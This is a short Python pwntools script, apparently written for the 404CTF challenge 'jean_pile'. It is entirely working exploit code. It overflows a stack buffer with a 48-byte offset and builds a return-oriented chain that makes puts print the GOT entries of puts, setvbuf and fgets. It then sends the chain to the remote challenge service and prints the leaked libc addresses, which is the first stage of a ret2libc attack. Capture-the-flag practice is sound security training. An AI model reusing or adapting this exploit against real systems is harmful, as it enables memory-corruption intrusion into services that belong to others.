from pwn import *

context.binary = binary = ELF("./jean_pile")

offset = 48
pop_rdi_ret = 0x400b83
puts_plt = binary.plt.puts
puts_got = binary.got.puts
setvbuf_got = binary.got.setvbuf
fgets_got = binary.got.fgets

payload = b"".join([
        b"A"*offset,
        b"SAVEDRBP",
        p64(pop_rdi_ret),
        p64(puts_got),
        p64(puts_plt),
        p64(pop_rdi_ret),
        p64(setvbuf_got),
        p64(puts_plt),
        p64(pop_rdi_ret),
        p64(fgets_got),
        p64(puts_plt),
        b"\n",
])

p = remote("challenges.404ctf.fr", 31957)

p.recvuntil(b">>> ")
p.send(b"1\n")
p.recv()
p.send(payload)

output = p.recv()

puts_leak = output.split(b"\n")[0]
puts_leak = u64(puts_leak.ljust(8, b"\x00"))
setvbuf_leak = output.split(b'\n')[1]
setvbuf_leak = u64(setvbuf_leak.ljust(8, b"\x00"))
fgets_leak = output.split(b"\n")[2]
fgets_leak = u64(fgets_leak.ljust(8, b"\x00"))

print("puts :", hex(puts_leak))
print("setvbuf :", hex(setvbuf_leak))
print("fgets :", hex(fgets_leak))
